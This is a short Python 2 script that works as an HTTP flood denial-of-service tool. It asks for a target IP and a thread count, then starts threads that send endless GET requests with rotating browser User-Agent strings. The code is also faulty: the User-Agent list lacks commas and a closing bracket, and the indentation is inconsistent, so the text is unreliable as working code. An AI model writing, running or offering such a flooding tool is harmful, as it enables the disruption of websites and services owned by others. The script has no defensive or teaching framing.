import sys
import random
import requests
import threading

print (" ")
host = raw_input("IP : ")
thread_num = input("Threads : ")
print (" ")

user_agent = [
  "Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d Build/OSR18H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"   
  "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 "
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"
  "Mozilla/5.0 (Macintosh; Intel Mac AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"

def run():
	if len(sys.argv)>=1:
		url="http://"+host
		print "Destination IP Address",host 
        while True:
			headers={'User-Agent': random.choice(user_agent)}
			r = requests.get(url,headers=headers)
			
	else:
		print "Only Works on HTTP Server !!!"

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
